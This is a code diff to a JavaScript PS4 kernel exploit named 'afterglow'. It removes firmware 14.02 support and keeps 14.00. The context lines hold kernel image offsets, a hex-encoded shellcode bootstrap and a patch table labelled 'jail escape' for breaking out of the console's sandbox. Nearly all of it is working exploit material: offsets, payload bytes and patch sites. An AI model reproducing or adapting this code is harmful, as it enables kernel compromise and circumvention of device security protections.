@@ -27,13 +27,12 @@ const S = {
   cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
-/* offsets into the kernel image, firmware 14.02 (measured from a 14.02 log) */
+/* offsets into the kernel image, firmware 14.00 */
 const K = {
   anchor:    0x00e6c30,
   swap_rbp:  0x0a80f68,
   prison0:   0x111fa18,
   rootvnode: 0x2136e90,
-  sysent:    0xffffffffb6d08a5c, /* 0xffffffffd29a8ab4 - 0x1bca0000, sysent[11] */
 };
 
 /* offsets into libSceLibcInternal, with the bytes that must be found there */
@@ -78,7 +77,7 @@ const BOOTSTRAP =
   + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
   + "20c0480d000001000f22c031c0c3";
 
-/* 14.02 patch sites, taken verbatim from a working 14.02 log */
+/* 14.00 patch sites */
 const PATCHES = [
   [0x01b7f5a4, "eb",       "jail escape 1"],
   [0x0874c14,  "eb",       "jail escape 2"],
@@ -639,7 +638,7 @@ function pinCore() {
   return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
 }
 
-const PADDING = 0xffffffffb7842400;
+const PADDING = 0x0b3a300;
 const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
 const RET0 = 0x00c3c031;
 
@@ -923,7 +922,7 @@ async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");
+  say("afterglow -- ps4 kernel exploit, firmware 14.00 (raw13 host)");
 
   const missing = seedStubs();
   if (missing.length) {
